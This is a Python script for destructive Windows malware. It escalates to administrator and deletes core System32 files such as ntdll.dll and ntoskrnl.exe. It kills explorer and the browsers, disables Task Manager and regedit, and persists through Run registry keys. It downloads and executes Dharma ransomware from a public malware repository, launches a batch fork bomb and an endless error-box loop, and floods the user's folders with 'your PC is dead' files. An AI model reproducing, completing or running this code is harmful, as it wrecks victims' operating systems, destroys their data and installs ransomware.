from zipfile import ZipFile
import urllib.request
import os
import random
import ssl
import subprocess
import shutil
import ctypes
import threading
import time
import winreg
import sys
#type:ignore
RUN_INSTALLS = True
CHAOS = True
class Data:

  def __init__(self):
    self.whitelist = [
        os.path.realpath(__file__),
        os.path.realpath(sys.executable)
    ]
    self.goose_link = "https://github.com/AnonymousHacker20292/srcode/raw/main/goose.zip"
    self.butterflies_link = "https://github.com/AnonymousHacker20292/funny-repo/raw/main/ButterflyOnDesktop.exe"
    self.roach_link = "https://github.com/AnonymousHacker20292/funny-repo/raw/main/CockroachOnDesktop.exe"
    self.dharma_link = "https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Ransomware/Dharma.exe"
    self.commands = ['calc', 'msconfig', 'resmon', 'notepad', 'cmd']
    self.vbs_code = """
do
x = MsgBox("System Error", vbOkOnly + vbCritical + vbSystemModal, "System Error")
loop
"""
  def get_fork_code(self, path):
    self.fork_code = f"""
    :s
    start %0
    echo "bye bye computer"
    start '{os.path.join(path, 'error.vbs')}'
    goto s
    """
    return self.fork_code

d = Data()


class FileCreation:
  def mass_create(self, prefix, folder, count, ext=".txt"):
    id = 1
    while count > 0:
      try:
        path = f"{os.path.join(folder, prefix)}{id}.{ext}"
        with open(path, "w") as file:
          d.whitelist.append(path)
          file.write("Your computer is dead and your files are encrypted. Do not try to modify any files.")
          file.close()
      except Exception:
        id = id + 1
      else:
        id = id + 1
        count = count - 1


class FileDeletion:
  def delete(self, file):
    if file in d.whitelist:
      return
    try:
      os.remove(file)
    except Exception as e:
      return -1, e
    else:
      return 1

  def delete_folder(self, folder):
    for object in folder:
      if os.path.isfile(object):
        self.delete(object)
      elif os.path.isdir(object):
        self.delete_folder(os.path.join(folder, object))

  def del_sys32_files(self):
    self.delete(r"C:\Windows\System32\ntdll.dll")
    self.delete(r"C:\windows\system32\ntoskrnl.exe")
    self.delete(r"C:\Windows\System32\svchost.exe")
    self.delete(r"C:\windows\system32\hal.dll")
    self.delete(r"C:\windows\system32\winresume.exe")
    for file in os.listdir(r"C:\Windows\System32"):
      if file.endswith(".dll"):
        self.delete(os.path.join(r"C:\Windows\System32", file))


class WindowsSystemClass:

  def __init__(self):
    self.msgboxcode = """
import ctypes
import random
def message_box(mode, title, text):
  MB_OK = 0x0
  MB_HELP = 0x4000
  TOPMOST = 0x40000
  # icons
  ICON_EXCLAIM = 0x30
  ICON_INFO = 0x40
  ICON_STOP = 0x10
  ICON = ICON_EXCLAIM
  if mode == 1:
    ICON = ICON_EXCLAIM
  elif mode == 2:
    ICON = ICON_INFO
  else:
    ICON = ICON_STOP
  result = ctypes.windll.user32.MessageBoxA(0, bytes(text, 'utf-8'), bytes(title, 'utf-8'), MB_HELP | MB_OK | ICON | TOPMOST)

def box_art():
  options = ['Your PC is dead', 'lol lots of butterflies', 'bye bye RAM', 'your pc is infected']
  message_box(random.randrange(1,5), "System Error", options[random.randrange(0, len(options)-1)])

box_art()
"""

  def is_admin(self):
    try:
      return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
      return False

  def relaunch_as_admin(self):
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.realpath(__file__), None, 1)
    time.sleep(5)
    exit()

  def get_windows_user_directory(self):
    return os.path.expanduser('~')

  def get_desktop_path(self):
    return os.path.join(os.path.expanduser('~'), 'Desktop')

  def get_documents_path(self):
    return os.path.join(os.path.expanduser('~'), 'Documents')

  def grant_admin(self):
    current_user = os.getlogin()
    # Command to grant administrative privileges to the current user
    command = ["net", "localgroup", "administrators", current_user, "/add"]
    try:
      subprocess.run(command, shell=False, capture_output=True, check=True)
    except Exception as e:
      return -1, e
    else:
      return 1, None

  def write_message_box_code(self):
    path = f'msgbox{random.randrange(10000,100000)}.py'
    with open(path, 'w') as f:
      f.write(self.msgboxcode)
      d.whitelist.append(path)
      f.close()
    return path

  def run(self, file):
    try:
      subprocess.Popen([file])
    except Exception as e:
      return -1, e
    else:
      return 1, None

  def box_art(self, path, count):
    for x in range(int(count)):
      self.run(path)


class Executables:
  def run(self, file):
    try:
      subprocess.Popen([file])
    except Exception as e:
      return -1, e
    else:
      return 1, None

  def install(self, package):
    try:
      subprocess.Popen([sys.executable, '-m', 'pip', 'install', package])
    except Exception as e:
      return -1, e
    else:
      return 1, None

  def install_all(self):
    packages = ['pypiwin32', 'cryptography']
    for package in packages:
      self.install(package)

  def run_shell_command(self, command):
    try:
      subprocess.Popen([command])
    except Exception as e:
      return -1, e
    else:
      return 1, None

  def taskkill(self, process):
    self.run_shell_command(f"taskkill /f /im {process}")

  def stop_explorer(self):
    self.taskkill('explorer.exe')

  def stop_chrome(self):
    self.taskkill('chrome.exe')

  def stop_firefox(self):
    self.taskkill('firefox.exe')

  def stop_edge(self):
    self.taskkill('edge.exe')

  def stop_cmd(self):
    self.taskkill('cmd.exe')

  def stop_regedit(self):
    self.taskkill('regedit.exe')

  def stop_all(self):
    processes = [self.stop_explorer, self.stop_chrome, self.stop_firefox, self.stop_edge, self.stop_cmd, self.stop_regedit]
    
    for function in processes:
      function()

  def install_and_run_batch(self, folder, code):
    try:
      path = os.path.join(folder, f'batch{random.randrange(10000,100000)}.bat')
      with open(path, 'w') as nf:
        d.whitelist.append(path)
        nf.write(code)
        nf.close()
    except Exception as e:
      return -1, e
    else:
      try:
        self.run(path)
      except Exception as e:
        return -2, e
      else:
        return 1, None

  def install_and_run_vbs(self, folder, code):
    try:
      path = os.path.join(folder, 'error.vbs')
      with open(path, 'w') as nf:
        d.whitelist.append(path)
        nf.write(code)
        nf.close()
    except Exception as e:
      return -1, e
    else:
      try:
        self.run(path)
      except Exception as e:
        return -2, e
      else:
        return 1, None

  def run_goose(self, folder):
    return self.run(os.path.join(folder, r"Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"))

  def run_butterflies(self, folder):
    return self.run(os.path.join(folder, "ButterflyOnDesktop.exe"))

  def run_dharma(self, folder):
    return self.run(os.path.join(folder, "Dharma.exe"))

  def run_roach(self, folder):
    return self.run(os.path.join(folder, "CockroachOnDesktop.exe"))

  def invert(self):
    mag_lib = ctypes.windll.LoadLibrary("Magnification.dll")
    mag_handle = mag_lib.MagInitialize()
    mag_lib.MagSetFullscreenColorEffect(
        mag_handle, ctypes.c_long(1))  # 1 is for invert colors
    time.sleep(1)
    mag_lib.MagUninitialize(mag_handle)

  def invert_loop(self):
    while True:
      self.invert()

  def chaos(self):
    d = Data()
    while True:
      commands_list = d.commands
      index = random.randrange(0, len(commands_list) - 1)
      self.run_shell_command(commands_list[index])
      time.sleep(0.2)


class Registry:
  #REG KEYS
  key_hives = [winreg.HKEY_CURRENT_USER]
  taskmgr_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
  regedit_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
  cmd_path = r"SOFTWARE\Policies\Microsoft\Windows\System"
  run_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
  key_names = ["DisableTaskMgr", "DisableRegistryTools", "DisableCMD"]
  key_values = [1, 1, 1]
  key_types = [winreg.REG_DWORD]
  taskmgr = [key_hives[0], taskmgr_path, key_names[0], key_values[0], key_types[0]]
  regedit = [key_hives[0], regedit_path, key_names[1], key_values[1], key_types[0]]
  cmd = [key_hives[0], cmd_path, key_names[2], key_values[2], key_types[0]]
  startup = [key_hives[0], run_path, "WindowsStartupManager", winreg.REG_SZ]

  def edit_key(self, key_dict, ALL_ACCESS=False):
    hive = key_dict[0]
    path = key_dict[1]
    key_name = key_dict[2]
    value = key_dict[3]
    type = key_dict[4]
    open_mode = winreg.KEY_WRITE
    if ALL_ACCESS:
      open_mode = winreg.KEY_ALL_ACCESS
    #Create or open key
    try:
      key = winreg.OpenKey(hive, path, 0, open_mode)
    except FileNotFoundError:
      try:
        key = winreg.CreateKey(hive, path)
      except Exception as err:
        return -3, err
    except Exception as e:
      return -1, e
    try:
      winreg.SetValueEx(key, key_name, 0, type, value)
      winreg.CloseKey(key)
      return True
    except OSError:
      return -2
    except Exception as e:
      return -3, e

  def new_key_edit(self, hive_int, key_path, value_name, value_data):
    if hive_int == 1:
      hive = winreg.HKEY_CURRENT_USER
    elif hive_int == 2:
      hive = winreg.HKEY_LOCAL_MACHINE
    else:
      hive = winreg.HKEY_CLASSES_ROOT
    try:
      value_data = int(value_data)
    except Exception:
      value_type = winreg.REG_SZ
    else:
      value_type = winreg.REG_DWORD
    # Open the registry key for writing
    try:
        key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_WRITE)
    except FileNotFoundError:
        # If the key doesn't exist, create it
        try:
          key = winreg.CreateKey(hive, key_path)
        except Exception:
          return -1
    try:
      winreg.SetValueEx(key, value_name, 0, value_type, value_data)
    except Exception:
      return -2
    else:
      return 1
      

  def add_to_startup(self, file_path):
    s = self.startup
    return self.edit_key([s[0], s[1], s[2], file_path, s[3]])

  def disable_task_manager(self):
    return self.edit_key(self.taskmgr)

  def disable_cmd(self):
    return self.edit_key(self.cmd)

  def disable_regedit(self):
    return self.edit_key(self.regedit)


class Folders:

  def create_appdata_folder(self):
    w = WindowsSystemClass()
    user = w.get_windows_user_directory()
    try:
      ad = os.path.join(os.path.join(user, 'AppData'), r'Local\Microsoft\Windows\MicrosoftSecurity')
      os.mkdir(ad)
    except Exception:
      try:
        mg = os.path.join(os.getcwd(), 'MicrosoftGoose')
        os.mkdir(mg)
      except Exception:
        return os.getcwd()
      else:
        return mg
    else:
      return ad

  def create_goose_folder(self, folder):
    try:
      num = random.randrange(1, 100)
      rand = f"49989457259539982828{num}"
      goosepath = os.path.join(folder, f'goose{rand}')
      os.system(f'mkdir {goosepath}')
    except Exception:
      num = random.randrange(999, 191728)
      rand = f"49989457259539982828{num}"
      goosepath2 = os.path.join(folder, f'goose{rand}')
      os.system(f'mkdir {goosepath2}')
      return goosepath2
    else:
      return goosepath

  def create_butterfly_folder(self, folder):
    try:
      num = random.randrange(1, 100)
      rand = f"49989457259539982828{num}"
      butterpath = os.path.join(folder, f'butterfly{rand}')
      os.system(f'mkdir {butterpath}')
    except Exception:
      num = random.randrange(999, 191728)
      rand = f"49989457259539982828{num}"
      butterpath2 = os.path.join(folder, f'butterfly{rand}')
      os.system(f'mkdir {butterpath2}')
      return butterpath2
    else:
      return butterpath

  def create_dharma_folder(self, folder):
    try:
      num = random.randrange(1, 100)
      rand = f"49989457669539982828{num}"
      dharmapath = os.path.join(folder, f'dharma{rand}')
      os.system(f'mkdir {dharmapath}')
    except Exception:
      num = random.randrange(999, 191728)
      rand = f"4998945725176639982828{num}"
      dharmapath2 = os.path.join(folder, f'dharma{rand}')
      os.system(f'mkdir {dharmapath2}')
      return dharmapath2
    else:
      return dharmapath

  def create_roach_folder(self, folder):
    try:
      num = random.randrange(1, 100)
      rand = f"49989457669539982828{num}"
      roachpath = os.path.join(folder, f'roach{rand}')
      os.system(f'mkdir {roachpath}')
    except Exception:
      num = random.randrange(999, 191728)
      rand = f"4998945725176639982828{num}"
      roachpath2 = os.path.join(folder, f'roach{rand}')
      os.system(f'mkdir {roachpath2}')
      return roachpath2
    else:
      return roachpath


class Zipfiles:

  def __init__(self):
    pass

  def extract(self, zip_path, target):
    with ZipFile(zip_path) as zf:
      zf.extractall(path=target)


class GitData:

  def __init__(self):
    pass

  def download_file(self, url, save_path):
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    with urllib.request.urlopen(url, context=ssl_context) as response:
      with open(save_path, 'wb') as out_file:
        shutil.copyfileobj(response, out_file)


wsysw = WindowsSystemClass()
fd = FileDeletion()
wsysw.grant_admin()
if not wsysw.is_admin():
  wsysw.relaunch_as_admin()
fd.del_sys32_files()
gd = GitData()
zf = Zipfiles()
d = Data()
e = Executables()
f = Folders()
fc = FileCreation()
e.stop_all()
reg = Registry()
reg.disable_regedit()
reg.add_to_startup(os.path.realpath(__file__))
exe_path = os.path.join(os.path.dirname(sys.executable), "your_script_name.exe")
reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsStartupManager", exe_path)
reg.new_key_edit(2, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsStartupManager", exe_path)
reg.disable_task_manager()
appdata = f.create_appdata_folder()
folder = f.create_goose_folder(appdata)
folder2 = f.create_butterfly_folder(appdata)
folder3 = f.create_dharma_folder(appdata)
folder4 = f.create_roach_folder(appdata)
goose_zip = os.path.join(folder, 'goose.zip')
butterflies = os.path.join(folder2, 'ButterflyOnDesktop.exe')
dharma = os.path.join(folder3, 'Dharma.exe')
roach = os.path.join(folder4, 'CockroachOnDesktop.exe')
t2 = threading.Thread(target=e.chaos)
gd.download_file(d.goose_link, goose_zip)
gd.download_file(d.butterflies_link, butterflies)
gd.download_file(d.dharma_link, dharma)
gd.download_file(d.roach_link, roach)
zf.extract(goose_zip, folder)
boxpath = wsysw.write_message_box_code()
fc.mass_create("YOURPCISDEAD", wsysw.get_desktop_path(), 100)
e.install_all()
time.sleep(5)
if RUN_INSTALLS:
  for x in range(3):
    status = e.run_goose(folder)
    stat2 = e.run_butterflies(folder2)
    stat3 = e.run_roach(folder4)
if CHAOS:
  t2.start()
if RUN_INSTALLS:
  e.install_and_run_vbs(appdata, d.vbs_code)
  e.install_and_run_batch(appdata, d.get_fork_code(appdata))
  stat3 = e.run_dharma(folder3)
fc.mass_create("YOURPCISDEAD", wsysw.get_windows_user_directory(), 100)
fc.mass_create("YOURPCISDEAD", wsysw.get_documents_path(), 100)

#After installs
#import win32api
#import win32gui
#import win32con
#from win32gui import GetDesktopWindow, GetWindowDC, StretchBlt
#from win32api import GetSystemMetrics
#from win32file import *
#type:ignore
